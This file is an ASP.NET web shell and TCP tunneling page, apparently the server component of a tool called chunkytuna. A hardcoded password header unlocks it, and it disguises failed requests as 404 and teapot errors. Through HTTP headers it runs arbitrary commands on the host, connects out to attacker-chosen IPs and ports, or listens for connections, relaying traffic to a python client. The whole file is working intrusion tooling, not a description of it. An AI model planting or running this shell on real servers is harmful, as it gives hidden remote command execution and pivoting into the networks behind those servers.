<%@ Page Language="C#" ENABLESESSIONSTATE="true"  DEBUG="true" ValidateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
static Int32 BUFSIZE = 4096;

public void Page_Load(object sender, EventArgs e)
{
    if (Request.Headers["X-Pwd"] != "Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y") {
        Response.Status = "418 I'm a teapot";
        Response.Write("Invalid Request\r\n");
        throw new HttpException(404, "Not Found");

    }

    HttpContext.Current.Response.ContentType = "application/octet-stream";
    Response.ContentEncoding = Encoding.UTF8;
    Response.BufferOutput = false;

    if (Request.Headers["X-Nop"] == "1") {
        // do nothing. dummy event.
        // used to initialise the session storage
        // which might take more than one attempt to start returning cookies
        // ...go figure.
        Session["nop"] = null;
        return;
    }
    // var mode = Request.Headers["X-Type"];
    String mode = Request.Headers["X-Type"];

    /*
     * Initialisation of the shell
     */
    if (Request.Headers["X-Init"] == "1") {
        HttpContext.Current.Response.Write("INIT");
        // var ip = Request.Headers["X-Ip"];
        // var port = Convert.ToInt32(Request.Headers["X-Port"]);
        String ip = Request.Headers["X-Ip"];
        int port = Convert.ToInt32(Request.Headers["X-Port"]);

        if (mode == "C") {
            // connect to target
            IPAddress ipAddress = IPAddress.Parse(ip); // ipHostInfo.AddressList[0];  
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);  
            // option 1: using sockets
            Socket socket;
            socket = new Socket(ipAddress.AddressFamily,
                    SocketType.Stream,
                    ProtocolType.Tcp);
            Session["targetSock"] = socket;
            // TODO try/catch exception, raise error
            socket.Connect(remoteEP);
        } else if (mode == "L") {
            // listen for connections from target
            HttpContext.Current.Response.Write("LISTENING");
            IPAddress ipAddress = IPAddress.Parse(ip); // ipHostInfo.AddressList[0];  
            Socket listenSocket = new Socket(
                    // AddressFamily.InterNetwork, 
                    ipAddress.AddressFamily,
                    SocketType.Stream,
                    ProtocolType.Tcp);
            // XXX DO NOT set timeouts less than 120s-- will f00k the 120s bug
            // listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 10000);
            // listenSocket.ReceiveTimeout = 180000;

            // bind the listening socket to the port
            IPEndPoint ep = new IPEndPoint(ipAddress, port);
            try {
                listenSocket.Bind(ep);
            } catch(Exception ex) {
                HttpContext.Current.Response.Write("If you've disconnected a previous session, the timeout to re-bind the port is 180s. [Exception in bind: "+ ex + "]\n");
                listenSocket.Close();
                return;
            }
            // start listening
            // parameter is 'backlog': The backlog parameter specifies the
            // number of incoming connections that can be queued for
            // acceptance. To determine the maximum number of connections you
            // can specify, retrieve the MaxConnections value. Listen does not
            // block.
            // SocketOptionName.MaxConnections
            // but... MaxConnections:
            // Not supported; will throw a SocketException if used.
            // ¯\_(ツ)_/¯
            listenSocket.Listen(65535);
            // listenSocket.Listen(1);

            // right, time to wait for a connection
            // this will block
            Socket handler = listenSocket.Accept();

            // XXX set script timeout
            // this does not appear to do anything, even without debug=false?
            // Page.Server.ScriptTimeout = 60;

            Session["targetSock"] = handler;

            // THIS 
            // THIS FIXES IT
            // don't pass listenSocket in the Session.  If you do, the IIS
            // worker will keep the port listening and it will be impossible to
            // close it
            listenSocket.Close();

        } else if (mode == "X") {
            // var cmd = Request.Headers["X-Cmd"];
            String cmd = Request.Headers["X-Cmd"];
            string[] cmdline = cmd.Split(new char[] {' '}, 2);
            Process proc = new Process();
	    proc.StartInfo.FileName = cmdline[0];
	    // rest of the arguments
	    // Arguments = cmdline[1],
	    // TODO look into this, check it's OK to be false
	    proc.StartInfo.UseShellExecute = false;
	    proc.StartInfo.RedirectStandardOutput = true;
	    proc.StartInfo.RedirectStandardInput = true;
	    proc.StartInfo.RedirectStandardError = true;
	    proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            Session["procInput"] = proc.StandardInput;
            Session["procOutput"] = proc.StandardOutput;
            // TODO standard error?

        } else {
            // invalid mode
            HttpContext.Current.Response.Write("INIT FAILED\n");
        }

        HttpContext.Current.Response.Write("SUCCESS");
        // return here, since initialisation is done.
        // python client will then connect again
        // with X-ServerSide
        return;
    }

    //
    // At this point the connection is set up
    //

    if (Request.Headers["X-ServerSide"] == "1") {
        // data coming from target and going back to the python client
        // goes through this branch (and will get stuck in the while
        // loop, until the target socket is broken)

        // Don't buffer response *VERY IMPORTANT*
        int bytesRead;
        byte[] receiveBuffer = new byte[4096];

        if (mode == "L" || mode == "C") {
            Socket socket = Session["targetSock"] as Socket;
            try {
                while ((bytesRead = socket.Receive(receiveBuffer)) > 0 ) {
                    byte[] received = new byte[bytesRead];
                    Array.Copy(receiveBuffer, received , bytesRead);
                    Response.BinaryWrite(received);
                }
            } catch(Exception ex){
                // TODO prolly not worth returning as an exception
                HttpContext.Current.Response.Write("[Exception when receiving data from target]: "+ ex + "\n");
            }
        } else if (mode == "X") {
            // TODO is this left dangling, or is it closed after timeout?
            char[] receiveCharBuffer = new char[4096];
            StreamReader stdout = Session["procOutput"] as StreamReader;
            while ((bytesRead = stdout.Read(receiveCharBuffer, 0, receiveCharBuffer.Length)) > 0 ) {
                byte[] received = new byte[bytesRead];
                receiveBuffer = Encoding.GetEncoding("UTF-8").GetBytes(receiveCharBuffer);
                // need to copy, otherwise it's adding to the
                // buffer every time
                Array.Copy(receiveBuffer, received, bytesRead);
                Response.BinaryWrite(received);
                // this repeats the output every time (why?)
                // Response.BinaryWrite(Encoding.GetEncoding("UTF-8").GetBytes(receiveCharBuffer));
            }
        } else {
            Response.Write("CMD FAILED");
        }

        return;
    } else {
        // TODO now there's a X-ClientSide: 1 header too...
        // data arriving from the python client and going to the
        // target lands in this branch

        if (mode == "C" | mode == "L") {
            // option 1; using sockets
            Socket socket = Session["targetSock"] as Socket;
            // read from chunkytuna and send over to the server-side socket
            byte[] postData = Request.BinaryRead(Request.TotalBytes);
            if (postData.Length > 0){
                try{
                    socket.Send(postData);
                }
                catch(Exception ex){
                    Response.Status = "500 Server Error";
                    HttpContext.Current.Response.Write("[Exception when sending data] "+ ex + "\n");
                }
            }
        } else if (mode == "X") {
            char[] receiveCharBuffer = new char[4096];
            StreamWriter stdin = Session["procInput"] as StreamWriter;
            byte[] postData = Request.BinaryRead(Request.TotalBytes);
            if (postData.Length > 0) {
                // byte[] to char[]
                stdin.Write(Encoding.UTF8.GetString(postData).ToCharArray());
            }
        } else {
            Response.Write("CLIENT CMD FAILED");
        }
        // end option 1

    }
}

</script>
